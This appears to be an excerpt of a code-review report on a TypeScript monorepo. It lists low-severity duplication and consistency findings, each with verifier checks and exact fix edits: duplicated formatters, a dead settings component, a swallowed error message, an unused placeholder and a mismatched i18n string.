**Note:** Two more identical formatAmount bodies exist at packages/checkout/src/modules/checkout/backend/checkout/transactions/page.tsx:50 and .../transactions/[id]/page.tsx:78, both duplicating formatCurrency at packages/ui/src/utils/format.ts:8; a separate, equally small edit.
**Verifier:** I opened all five cited locations and every line number is exact, with byte-identical bodies. LaneCurrencyBreakdown.tsx:167-173 (formatAmount) and :175-181 (formatToday); CurrencyBreakdownTable.tsx:102-108 (formatAmount); CurrencyFilterPopover.tsx:285-291 (formatAmount) and :293-299 (formatToday). constants.ts:1-16 exists and lines 6-8 carry the quoted "Centralised here so the value can't drift..." rationale verbatim.

Refutation checks that all failed:
- Not tests/generated/dist/vendored — three real client components under packages/core.
- Not already fixed: `git status --porcelain` on the pipeline directory is empty.
- Not a false "dominant pattern" claim: `graft_find_all "function formatAmount\("` returns 9 repo-wide hits, but only these three share the `(amount: number): string` decimal/rounded/no-currency shape. The other six (sales/search.ts:145, sales/widgets/dashboard/shared.ts:19, payment_gateways/page.tsx:115, warranty_claims/[id]/page.tsx:612, and the two checkout ones) all take a currency code and use `style: 'currency'` — legitimately different functions, correctly excluded. `formatToday` has exactly 2 repo-wide definitions, both in this directory.
- Not a documented 
**Fix notes:** Exact edits:

1. Append to packages/core/src/modules/customers/backend/customers/deals/pipeline/components/constants.ts (preferred over a new formatters.ts — the file's own docstring already declares it the anti-drift module for this directory, and it is already imported by client components Lane.tsx:12 and AddStageLane.tsx:7, so the client-bundle path is proven; it has no "use client" directive and needs none, being a pure module):

    export function formatAmount(amount: number): string {
      return new Intl.NumberFormat(undefined, {
        style: 'decimal',
        maximumFractionDigits: 0,
        useGrouping: true,
      }).format(Math.round(amount))
    }

    export function formatToday(): string {
      return new Intl.DateTimeFormat(undefined, {
        year: 'numeric',
        month: 'short',
        day: '2-digit',
      }).format(new Date())
    }

2. Delete the five loca

## [LOW] duplication — Dead duplicate `AiAssistantSettingsPageClient.tsx` under `frontend/components/`, and packages/ai-assistant/AGENTS.md points agents at that dead copy
**Lane:** dup-surface  **Fix is safe:** True
**Divergent sites:**
- packages/ai-assistant/src/modules/ai_assistant/frontend/components/AiAssistantSettingsPageClient.tsx:409
- packages/ai-assistant/AGENTS.md:516
**Canonical:** packages/ai-assistant/src/modules/ai_assistant/components/AiAssistantSettingsPageClient.tsx:878
**Why it matters:** An agent or developer following the module's own AGENTS.md file tree edits the 418-line orphan, sees no change in the running settings page, and ships a raw-fetch, hardcoded-string, untranslated file that nothing renders. The doc also names `McpServersSection.tsx`, which does not exist, and gives the route as `backend/config/ai-assistant/page.tsx` where the real one is `backend/config/ai-assistant/settings/page.tsx`.
**Proposed fix:** Delete `packages/ai-assistant/src/modules/ai_assistant/frontend/components/AiAssistantSettingsPageClient.tsx` (and the now-empty `frontend/` tree under that module), and correct packages/ai-assistant/AGENTS.md:515-517 to list `components/` with its five real files (AiAssistantSettingsPageClient.tsx, ConversationShareButton.tsx, ConversationShareDialog.tsx, McpConfigDialog.tsx, SessionKeyDialog.tsx) and the route as `backend/config/ai-assistant/settings/page.tsx`.
**Verifier:** I opened every cited file and could not break the finding. (1) `packages/ai-assistant/src/modules/ai_assistant/frontend/components/AiAssistantSettingsPageClient.tsx` exists, is 418 lines, and `export function AiAssistantSettingsPageClient()` is exactly at :409 with `export default` at :418. (2) `find packages/ai-assistant/src/modules/ai_assistant/frontend -type f` returns that ONE file — no index.ts, no page.tsx. (3) Both live routes import the other copy: `backend/config/ai-assistant/settings/page.tsx:2` and `backend/config/ai-assistant/legacy/page.tsx:2` both resolve to `../../../../components/AiAssistantSettingsPageClient` (i.e. `modules/ai_assistant/components/`), whose export is at :878. (4) A repo-wide grep (excluding node_modules/dist) finds no importer of the `frontend/` copy; `grep -rl "AiAssistantSettingsPageClient|ai_assistant/frontend" apps/mercato/.mercato/generated/` returns 0 files. (5) I checked the auto-discovery escape hatch specifically: `packages/cli/src/lib/generators/scanner.ts:131` scans the module `frontend/` folder, but its `isPageCandidateFile` predicate (scanner.ts:124-126) accepts a component file only when the stripped basename does NOT start with an up
**Fix notes:** Exact edits:
1. `rm packages/ai-assistant/src/modules/ai_assistant/frontend/components/AiAssistantSettingsPageClient.tsx` and remove the now-empty `packages/ai-assistant/src/modules/ai_assistant/frontend/` tree (that file is its only inhabitant). No re-export, barrel, generator entry, or dynamic import points at it.
2. Replace `packages/ai-assistant/AGENTS.md:515-517` with a `components/` entry listing the five real files: `AiAssistantSettingsPageClient.tsx`, `ConversationShareButton.tsx` (one-line re-export of `@open-mercato/ui/ai`), `ConversationShareDialog.tsx` (same), `McpConfigDialog.tsx`, `SessionKeyDialog.tsx`. Drop `McpServersSection.tsx` — it exists nowhere in the repo.
3. Fix `packages/ai-assistant/AGENTS.md:519-520`: the `backend/config/ai-assistant/` subtree has `page.tsx` (a redirect to `/backend/config/ai-assistant/agents`, `navHidden`), plus `settings/`, `agents/`, `allowl

## [LOW] consistency — TaxRatesSettings discards the server's error message on a failed save while its two sibling settings panels surface it
**Lane:** forms-validation  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/sales/components/TaxRatesSettings.tsx:231
**Canonical:** packages/core/src/modules/sales/components/ShippingMethodsSettings.tsx:668
**Why it matters:** `/api/sales/tax-rates` is a makeCrudRoute endpoint, so its 400/409 bodies carry a specific reason (duplicate `code`, `countryCode` not exactly 2 characters per taxRateCreateSchema at sales/data/validators.ts:319, unique-constraint conflict). The user gets only the generic "Failed to save tax rate" with no indication of which field is wrong, while creating a shipping or payment method under the identical failure shows the actual reason.
**Proposed fix:** Replace line 231 with the sibling's two lines: `const message = err instanceof Error ? err.message : translations.errors.save` then `flash(message, 'error')`.
**Verifier:** SURVIVES. I opened every cited file and confirmed each claim.

(1) Divergent site is real and at the cited line. TaxRatesSettings.tsx:230-231 reads exactly `logger.error('sales.tax-rates.save failed', { err })` / `flash(translations.errors.save, 'error')`. Not fixed in the working tree (`git status --porcelain` on the file is empty).

(2) Canonical is real and dominant. ShippingMethodsSettings.tsx:667-669 and PaymentMethodsSettings.tsx:350-352 match the quoted code byte-for-byte. The `err instanceof Error ? err.message : <fallback>` pattern appears at 8 sites across 4 files in the SAME folder (StatusSettings 247/308, AdjustmentKindSettings 272/311, ShippingMethods 571/668, PaymentMethods 314/351). TaxRatesSettings is the only panel in the folder that discards it. Dominance confirmed.

(3) The mechanism holds — I checked the one thing that could have killed it. `raiseCrudError` (serverErrors.ts:263-292) reads `res.text()` off `call.response`, and I verified `apiCall` (apiCall.ts) reads the body from `response.clone()`, NOT the original — so `call.response`'s body is still unread when `raiseCrudError` gets it, and the server message really is available. `buildHttpError` (serverErrors
**Fix notes:** EXACT EDIT (save path), TaxRatesSettings.tsx:230-231 — replace:
      logger.error('sales.tax-rates.save failed', { err })
      flash(translations.errors.save, 'error')
with:
      logger.error('sales.tax-rates.save failed', { err })
      const message = err instanceof Error ? err.message : translations.errors.save
      flash(message, 'error')

The `useCallback` dependency array at line 233 already contains `translations.errors.save` — no dep change needed.

RECOMMENDED SECOND EDIT (the finding missed it), TaxRatesSettings.tsx:257-258 — the delete path has the identical divergence against ShippingMethodsSettings.tsx:571 and PaymentMethodsSettings.tsx:314. Same shape, using `translations.errors.delete`. Its dep array at line 259 already contains `translations.errors.delete`. Fixing save but not delete would leave the file half-consistent.

TWO CORRECTIONS TO THE FINDING'S `why` (the im

## [LOW] consistency — ComingSoonPlaceholder has zero importers and its only remaining reference is a stale jest.mock for a module the page under test no longer imports
**Lane:** open-loops  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/customers/components/detail/ComingSoonPlaceholder.tsx:10
- packages/core/src/modules/customers/backend/customers/companies-v2/[id]/__tests__/page.test.tsx:189
**Canonical:** packages/core/src/modules/customers/components/detail/aiActionCatalog.ts:37
**Why it matters:** The component is dead code, and the surviving `jest.mock` gives a false signal that the companies-v2 detail page still renders scaffolded tabs — a reader or agent auditing that test believes a placeholder path exists that no longer does. Two module-scoped "coming soon" mechanisms in one folder (this one and aiActionCatalog) also means new work can pick the unreachable one.
**Proposed fix:** Delete packages/core/src/modules/customers/components/detail/ComingSoonPlaceholder.tsx and remove the now-pointless `jest.mock` block at packages/core/src/modules/customers/backend/customers/companies-v2/[id]/__tests__/page.test.tsx:189-191. Nothing imports the module, so the test keeps passing.
**Note:** Dead, not orphaned. Referenced only by a test (the stale jest.mock) — flagging that explicitly per the lane rules. .ai/specs/2026-04-06-crm-detail-pages-ux-enhancements.md:1096-1098 describes it as "rendered in tab slots", which is doc drift against the current code; that spec's phase describing it appears to have been superseded rather than scheduled, so it does not cover this.
**Verifier:** Survives. I opened both cited files and confirmed every claim. (1) packages/core/src/modules/customers/components/detail/ComingSoonPlaceholder.tsx exists (718 bytes, 21 lines); the export is at line 10 exactly as claimed. `yarn graft callers ComingSoonPlaceholder --depth all` returns "ComingSoonPlaceholder · function · ...ComingSoonPlaceholder.tsx:L10-L21 — no indexed callers". (2) A repo-wide grep for `ComingSoonPlaceholder` across *.ts/*.tsx/*.json/*.md (node_modules and graft/ excluded) returns only four hits: the component's own type alias (L6) and export (L10), and the jest.mock at packages/core/src/modules/customers/backend/customers/companies-v2/[id]/__tests__/page.test.tsx:189-190 — plus the spec mention. (3) The page under test does not import it: I read all 49 imports at the top of packages/core/src/modules/customers/backend/customers/companies-v2/[id]/page.tsx — it imports DealsSection, ActivityLogTab, CompanyPeopleSection, CompanyDetailHeader, CompanyDetailTabs, CompanyKpiBar, ScheduleActivityDialog, ChangelogTab, useDealsAccess, useInteractionMutations and formConfig, and grep for `ComingSoon|comingSoon` in that file returns nothing (exit 1). I ruled out every standard
**Fix notes:** Exact edits:
1. `rm packages/core/src/modules/customers/components/detail/ComingSoonPlaceholder.tsx`
2. In packages/core/src/modules/customers/backend/customers/companies-v2/[id]/__tests__/page.test.tsx delete lines 189-192 (the three-line jest.mock block plus its trailing blank line), leaving the CompanyPeopleSection mock ending at 187 directly followed by the ChangelogTab mock.
3. Remove the `"customers.detail.comingSoon"` entry (line 1582) from all 8 files under packages/core/src/modules/customers/i18n/: de, en, es, fr, ko, pl, vi, zh. Do not remove `customers.ai.comingSoon` (:91) or `customers.deals.kanban.comingSoon` (:1307) — both are live.

Why fixIsSafe=true: no DB migration, no ORM entity, no frozen persisted identifier (not an ACL feature id, event id, notification type, or schema column). Per BACKWARD_COMPATIBILITY.md and docs/architecture/adr/ADR-0004-compatibility-scope.md, 

## [LOW] consistency — `customers.people.detail.error.load` ships copy that contradicts both its own code default and the two sibling detail pages
**Lane:** states  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/customers/i18n/en.json:2087
- packages/core/src/modules/customers/i18n/zh.json:2087
- packages/core/src/modules/customers/i18n/vi.json:2087
- packages/core/src/modules/customers/i18n/fr.json:2087
**Canonical:** packages/core/src/modules/customers/i18n/en.json:584
**Why it matters:** These three pages are siblings a user moves between constantly (a company detail links to its people, a person to their deals), and all three are live routes — the list views at customers/companies/page.tsx:648 and customers/people/page.tsx:633 link to the -v2 detail pages. The same failure — the detail fetch returned nothing — is worded three ways, with the person variant also dropping the terminal period the other two carry. The `t()` fallback in the code says "Failed to load person.", so the string a developer reads at the call site is not the string the user sees, which makes the divergence easy to reintroduce.
**Proposed fix:** Change packages/core/src/modules/customers/i18n/en.json:2087 to "Failed to load person." so it matches the code's own default at people-v2/[id]/page.tsx:159 and the sibling entries at en.json:584 and :1042. Apply the same value to zh.json/vi.json/fr.json line 2087, which currently hold the untranslated English placeholder. Leave de/es/pl/ko alone — they carry genuine translations of the same meaning.
**Note:** Verified this is the live surface: the legacy customers/people/[id] and customers/companies/[id] detail pages are no longer linked from anywhere (both list pages route to the -v2 URLs), so only the -v2 pages render this key.
**Verifier:** I opened every cited file and confirmed each claim verbatim. en.json:2087 is exactly "Unable to load person details"; the siblings at en.json:584 ("Failed to load company.") and en.json:1042 ("Failed to load deal.") are exactly as quoted. All three people-v2 call sites (page.tsx:159, :174, :504) carry the literal fallback 'Failed to load person.', and companies-v2/[id]/page.tsx:466 matches its own dictionary — so the code's declared default genuinely contradicts the shipped string at three live sites. Dominance is not a coin flip: across the whole repo there are exactly six *.detail.error.load keys, and five use the "Failed to load <noun>" form (warranty_claims, example.priority, deals, companies, customer_accounts.admin); customers.people is the sole outlier and one of only two missing the terminal period. Live-surface claim verified: people/page.tsx:633 and companies/page.tsx:648 both link to the -v2 routes, as do onRowClick and the row actions. Not a test, not generated, not dist/.ai/graft — these are source i18n JSON and source .tsx. Working tree is clean, so it is not already fixed. The customers AGENTS.md documents no deliberate wording difference. TWO CORRECTIONS, both of wh
**Fix notes:** EXACT EDITS — four one-line value swaps, key names untouched:

1. packages/core/src/modules/customers/i18n/en.json:2087
   -  "customers.people.detail.error.load": "Unable to load person details",
   +  "customers.people.detail.error.load": "Failed to load person.",
2-4. Identical replacement at line 2087 of zh.json, vi.json and fr.json (all three currently hold the same English string; all three are 100% English mirrors of en.json, 2910/2910 keys identical, so mirroring the new value preserves their existing invariant).

Do NOT touch de/es/pl/ko — verified as real translations of the same meaning.
Do NOT touch any .tsx — the code fallbacks at people-v2/[id]/page.tsx:159/:174/:504 already say 'Failed to load person.', which is the whole point of the alignment. Optionally, for completeness, the legacy call sites at people/[id]/page.tsx:302 and :309 could be given the same second-argument 

---

# Refuted (not defects)
- **dup-surface** — Five copies of `api/guards.ts` run only the legacy DI guard, silently skipping every registry mutation guard (including the universal optimistic-lock floor): The duplication half of the finding checks out, but the consequence that justifies severity=high is factually wrong, and the wrongness inverts the conclusion.

WHAT I CONFIRMED (the true half):
- All five files exist. `diff messages/api/guards.ts staff|integrations|payment_gatewa
